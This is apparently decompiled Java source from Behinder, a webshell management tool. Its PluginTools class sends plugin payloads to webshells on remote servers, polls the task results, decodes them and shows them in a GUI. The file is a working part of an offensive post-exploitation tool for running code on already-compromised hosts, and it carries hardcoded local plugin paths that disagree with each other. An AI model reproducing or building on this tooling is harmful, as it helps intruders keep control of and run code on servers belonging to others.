package net.rebeyond.behinder.core;

import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javafx.application.Platform;
import javafx.scene.control.Label;
import javafx.scene.web.WebView;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

public class PluginTools {
   private ShellService currentShellService;
   private Label statusLabel;
   private WebView pluginWebview;
   private JSONObject shellEntity;
   private Map<String, String> taskMap = new HashMap();
   private String PluginBasePath = "d:/tmp/Plugins/";
   private List<Thread> workList;

   public PluginTools(ShellService shellService, WebView pluginWebview, Label statusLabel, List<Thread> workList) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.shellEntity;
      this.workList = workList;
      this.pluginWebview = pluginWebview;
      this.statusLabel = statusLabel;
   }

   public PluginTools(ShellService shellService, Label statusLabel, List<Thread> workList) {
      this.currentShellService = shellService;
      this.shellEntity = shellService.shellEntity;
      this.workList = workList;
      this.statusLabel = statusLabel;
   }

   public void sendTask(String pluginName, String paramStr) throws Exception {
      String type = this.shellEntity.getString("type");
      if (type.equals("jsp")) {
         type = "java";
      }

      if (type.equals("aspx")) {
         type = "dll";
      }

      String payloadPath = String.format(this.PluginBasePath + "/%s/payload/%s.payload", pluginName, type);
      JSONObject paramObj = new JSONObject(paramStr);
      Map<String, String> params = Utils.jsonToMap(paramObj);
      params.put("taskID", pluginName);
      this.statusLabel.setText("正在执行插件……");
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.submitPluginTask(pluginName, payloadPath, params);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            Platform.runLater(() -> {
               this.statusLabel.setText(msg);
            });
         } catch (Exception var7) {
            var7.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText("插件运行失败");
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   public void execTask(String pluginName, String paramStr) throws Exception {
      String type = this.shellEntity.getString("type");
      if (type.equals("jsp")) {
         type = "java";
      }

      String payloadPath = String.format(this.PluginBasePath + "/%s/payload/%s.payload", pluginName, type);
      JSONObject paramObj = new JSONObject(paramStr);
      Map<String, String> params = Utils.jsonToMap(paramObj);
      params.put("taskID", pluginName);
      this.statusLabel.setText("正在执行插件……");
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.submitPluginTask(pluginName, payloadPath, params);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            if (!status.equals("success")) {
               throw new Exception(msg);
            }

            Platform.runLater(() -> {
               this.statusLabel.setText("插件执行成功。");
            });
            JSONObject msgObj = new JSONObject(msg);
            String pluginResult = new String(Base64.getDecoder().decode(msgObj.getString("result")), "UTF-8");
            String pluginRunning = new String(Base64.getDecoder().decode(msgObj.getString("running")), "UTF-8");

            try {
               this.pluginWebview.getEngine().executeScript(String.format("onResult('%s','%s','%s')", status, pluginResult, pluginRunning));
            } catch (Exception var11) {
               this.statusLabel.setText("结果刷新成功，但是插件解析结果失败，请检查插件:" + var11.getMessage());
            }
         } catch (Exception var12) {
            var12.printStackTrace();
            Platform.runLater(() -> {
               this.statusLabel.setText("插件运行失败：" + var12.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   public void sendTaskBackground(String pluginName, Map<String, String> params, PluginSubmitCallBack callBack) throws Exception {
      String type = this.shellEntity.getString("type");
      if (type.equals("jsp")) {
         type = "java";
      }

      String payloadPath = String.format("/Users/rebeyond/Documents/Behinder/plugin/%s/payload/%s.payload", pluginName, type);
      params.put("taskID", pluginName);
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.submitPluginTask(pluginName, payloadPath, params);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            callBack.onPluginSubmit(status, msg);
         } catch (Exception var8) {
            callBack.onPluginSubmit("fail", var8.getMessage());
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   public String queryTaskList() {
      String result = "";
      return result;
   }

   public String queryTask(String taskName) {
      String result = "";
      return result;
   }

   public void getTaskResult(String pluginName) {
      this.statusLabel.setText("正在刷新任务执行结果……");
      Runnable runner = () -> {
         try {
            JSONObject resultObj = this.currentShellService.getPluginTaskResult(pluginName);
            String status = resultObj.getString("status");
            String msg = resultObj.getString("msg");
            JSONObject msgObj = new JSONObject(msg);
            String pluginResult = new String(Base64.getDecoder().decode(msgObj.getString("result")), "UTF-8");
            String pluginRunning = new String(Base64.getDecoder().decode(msgObj.getString("running")), "UTF-8");
            Platform.runLater(() -> {
               if (status.equals("success")) {
                  this.statusLabel.setText("结果刷新成功");

                  try {
                     this.pluginWebview.getEngine().executeScript(String.format("onResult('%s','%s','%s')", status, pluginResult, pluginRunning));
                  } catch (Exception var5) {
                     this.statusLabel.setText("结果刷新成功，但是插件解析结果失败，请检查插件:" + var5.getMessage());
                  }
               } else {
                  this.statusLabel.setText("结果刷新失败");
               }

            });
         } catch (Exception var8) {
            Platform.runLater(() -> {
               this.statusLabel.setText("结果刷新失败:" + var8.getMessage());
            });
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }

   public void getTaskResultBackground(String pluginName, PluginResultCallBack callBack) {
      Runnable runner = () -> {
         String running = "true";

         try {
            while(running.equals("true")) {
               JSONObject resultObj = this.currentShellService.getPluginTaskResult(pluginName);
               String status = resultObj.getString("status");
               String msg = resultObj.getString("msg");
               JSONObject msgObj = new JSONObject(msg);
               String pluginResult = new String(Base64.getDecoder().decode(msgObj.getString("result")), "UTF-8");
               String pluginRunning = msgObj.getString("running");
               running = pluginRunning;
               callBack.onPluginResult(status, pluginResult, pluginRunning);
               Thread.sleep(3000L);
            }
         } catch (Exception var10) {
            callBack.onPluginResult("fail", var10.getMessage(), "false");
         }

      };
      Thread workThrad = new Thread(runner);
      this.workList.add(workThrad);
      workThrad.start();
   }
}
